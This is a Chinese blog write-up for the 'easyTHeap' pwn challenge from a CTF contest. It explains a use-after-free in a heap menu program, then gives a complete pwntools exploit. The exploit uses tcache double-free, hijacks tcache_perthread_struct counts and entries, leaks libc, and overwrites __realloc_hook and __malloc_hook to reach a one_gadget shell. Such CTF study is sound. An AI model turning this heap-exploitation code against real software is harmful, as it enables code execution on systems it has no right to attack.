easyTHeap(tcachebin)_VN公开赛
Created 2020-07-23| Updated 2020-07-23|Buuoj
Post View:|Comments:

题目概览

题目下载

1.两张table分别存储相应的chunk的size和ptr，根据idx来索引

2.free后有UAF

3.free的时候只清空了对应的size，没有清空ptr且free前没做保护

4.Edit函数read的时候若这个chunk对应的bss_chunk_size_table[idx]中的size为0，那么读不进去东西。

5.最多Add 7次 delete 3 次，能申请到的最大大小0x100

6.Show可以打出已经被free后chunk的信息

攻击思路

思路1 劫持tcahcebin的count和entries，然后realloc调整栈空间打ogg

1.首先由于我们只能free三次，所以没法通过多次free把chunk拉进unsortbin，此时考虑劫持tcachebin的count，然后伪造count，使tcachebin处于已满状态，然后再free到unsotbin。如图所示

这个维护tcachebin状态的结构体位置在我们申请的chunk的上方
距离我们申请的第一个chunk偏移0x250，以下是这个结构体本体。

2.通过show打出free后chunk的next指针，由于tcache dup，此时这个next指针指向自己，然后减去0x250偏移，到达tcachebin的count。Add一次然后改next指向count。

3.把tcache_perthread_struct结构体申请回来（4号块），通过edit伪造count为很大的值。让tcachebin“以为”放满了。然后再delet掉 0号块，拉进unsortbin。

可以看到此时所有tcachebin的count已经满了，0号块进入unsortbin

4.Show打出unsortbin指针，算出libc加载基地址

5.继续编辑tcache结构体，此时不光劫持count，还要劫持entries表，我们改entries表的第一项（大小0x20）为reallochook

效果如下：

6.Add(0x10)从被劫持的tcache entries把realloc_hook申请回来，改reallochook为ogg,malloc hook为realloc+偏移调整栈空间。

思路1 exp

# encoding=utf-8
from pwn import *

#context.log_level = 'debug'
context.terminal='/bin/zsh'

s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)

r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)

elf = ELF("./vn_pwn_easyTHeap")
libc = ELF("/root/libc-2.27.so")
io = process("./vn_pwn_easyTHeap")
#io = remote("node3.buuoj.cn",29360)


def Add(s,c='1'):
    ru("choice: ")
    sl(str(c))
    ru("size?")
    sl(str(int(s)))

def Edit(idx,content,c='2'):
    ru("choice: ")
    sl(str(c))
    ru("idx?")
    sl(str(idx))
    ru("content:")
    s(content)

def Show(idx,c='3'):
    ru("choice: ")
    sl(str(c))
    ru("idx?")
    sl(str(idx))

def Delete(idx,c='4'):
    ru("choice: ")
    sl(str(c))
    ru("idx?")
    sl(str(idx))


if __name__ == '__main__':
    Add(0x100)   # 0
    Add(0x100)   # 1
    Delete(0)   # 0
    Delete(0)   # 0

    Show(0)
    chunk_1 = int(u64(r(6).ljust(8,'\x00'))) - 0x250 # tcache count
    print hex(chunk_1)
    Add(0x100)    # 2-0
    Edit(2,p64(chunk_1))   # 改next为tcache count
    Add(0x100)   #  3-0
    Add(0x100)   #  把tcache申请回来
    Edit(4,'a'*0x40)    # 改tcache count 劫持 count,此时申请到了tcache结构体
    #pause()
    Delete(0)   # 放进unsortbin
    #pause()
    #pause()
    Show(0)
    libc_base = int(u64(r(6).ljust(8,'\x00'))) - 96 - libc.sym['__malloc_hook'] - 0x10
    malloc_hook = libc_base + int(libc.sym['__malloc_hook'])
    realloc = libc_base + libc.sym['realloc']
    realloc_hook = libc_base + libc.sym['__realloc_hook']
    ogg = libc_base + 0x4f322
    print "malloc_hook :",hex(malloc_hook)
    print "libc_base :",hex(libc_base)
    print "realloc :",hex(realloc)
    print "realloc_hook :",hex(realloc_hook)
    print "ogg :",hex(ogg)


    Edit(4,'p'*0x40+p64(realloc_hook)) # 劫持tcache entries,前0x40是tcache count
    Add(0x10)                          # 5, 申请到malloc hook,注意此时对应的tcache entries大小为：0x20
    Edit(5,p64(ogg)+p64(realloc+9))    # 改reallochook为ogg,malloc hook为realloc+偏移控制push数量调整栈空间
    Add(0x10)
    io.interactive()
